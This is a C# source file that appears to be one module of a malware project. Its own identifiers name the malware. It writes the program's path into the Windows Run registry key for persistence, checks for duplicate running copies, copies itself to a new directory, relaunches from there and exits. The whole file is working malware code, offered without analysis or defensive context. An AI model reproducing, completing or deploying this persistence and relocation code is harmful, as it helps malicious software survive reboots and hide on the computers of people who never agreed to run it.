using System;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;
using System.IO;

namespace Kernel.Rooting {
    class Auxiliary {
        static bool ErrPoint = false;

        internal class Assistants {
            public static bool RegistryKeyExist() {
                RegistryKey registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                if (registry.GetValue(Config.MalwareRegistryName) != null) {
                    return true;
                } else { return false; }
            }
            public static string RegistryKeyRead() {
                RegistryKey registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                string result = registry.GetValue(Config.MalwareRegistryName).ToString();
                return result;
            }
            public static bool EmergencyCopy() {
                string CfgName = Config.MalwareFileName.Substring(0, Config.MalwareFileName.IndexOf('.'));
                Process[] pr = Process.GetProcesses();
                int count = 0;
                for (int i = 0; i < pr.Length; i++) {
                    if (pr[i].ProcessName == CfgName || 
                        pr[i].ProcessName == CfgName + ".exe" || 
                        pr[i].ProcessName == Process.GetCurrentProcess().ProcessName) {
                        count++;
                    }
                }
                if (count > 1) { return true; } else { return false; }; 
            }
        }

        internal class Fixation {
            public static bool Set() {
                ErrPoint = false;
                RegistryKey registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                try { registry.SetValue(Config.MalwareRegistryName, Assembly.GetExecutingAssembly().Location); } catch { ErrPoint = true; }
                registry.Close();
                return ErrPoint;
            }
            public static bool Remove() {
                ErrPoint = false;
                RegistryKey registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                try { registry.DeleteValue(Config.MalwareRegistryName); } catch { ErrPoint = true; }
                registry.Close();
                return ErrPoint;
            }
        }

        internal class Task {
            public static bool Migrate(string mDir, string mFile) {
                ErrPoint = false;
                try { 
                    File.Copy(Assembly.GetExecutingAssembly().Location, mDir + mFile); } catch { ErrPoint = true; } finally {
                    if (!ErrPoint) {
                        Process.Start(mDir + mFile);
                        Environment.Exit(0); 
                    } 
                } return ErrPoint;
            }
        }

    }
}
